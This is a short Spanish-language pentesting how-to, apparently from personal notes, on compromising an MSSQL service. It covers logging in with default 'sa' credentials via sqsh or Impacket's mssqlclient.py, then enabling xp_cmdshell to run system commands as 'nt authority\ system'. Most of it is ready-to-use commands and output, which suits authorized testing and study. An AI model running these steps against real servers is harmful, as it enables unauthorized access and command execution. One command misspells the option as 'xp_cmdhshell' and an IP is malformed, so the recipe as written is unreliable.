El servicio **ms-sql-s** dentro de nuestro **Low Hanging Fruit** es un buen servicio a enumerar, sobre todo para saber si cuenta con credenciales por defecto. En caso de contar con credenciales por defecto, nos podemos conectar vía **sqsh** o a través del script **mssqlclient.py**, pudiendo posteriormente probar si somos capaces de utilizar la funcionalidad **xp_cmdshell**, la cual nos permite ejecutar comandos sobre el sistema.

En caso de contar con credenciales válidas, podemos realizar la autenticación al servicio via **sqsh** de la siguiente forma:

```bash
sqsh -S 192.168.1.X -U sa -P superPassword
```

En caso de querer probar credenciales por defecto, como el usuario es **sa** y no posee password, simplemente omitimos el parámetro **-P**.

Una vez conectados, podemos realizar las siguientes instrucciones:

```bash
1> xp_cmdshell 'whoami'
2>go

nt authority\ system
```

Puede ser que se de el caso donde tras lanzar la instrucción **go**, se nos presente un mensaje que nos avisa de que el componente está deshabilitado. Para habilitarlo, simplemente seguimos las siguientes instrucciones:

```bash
1> EXEC SP_CONFIGURE 'show advanced options', 1
2> reconfigure
3> go
4> EXEC SP_CONFIGURE 'xp_cmdhshell', 1
5> reconfigure
6> go
7> xp_cmdshell "whoami"
8> go

nt authority\ system
```

Y ya lograremos ejecutar comandos sobre el sistema.

#### mssqlclient Impacket

El recurso lo podemos obtener [aquí](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py), y su uso es similar al de **psexec**. En mi caso, lo uso cuando han cambiado el puerto por defecto:

```bash
python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
```

Posteriormente, las consultas se hacen igual a las descritas en el anterior punto.
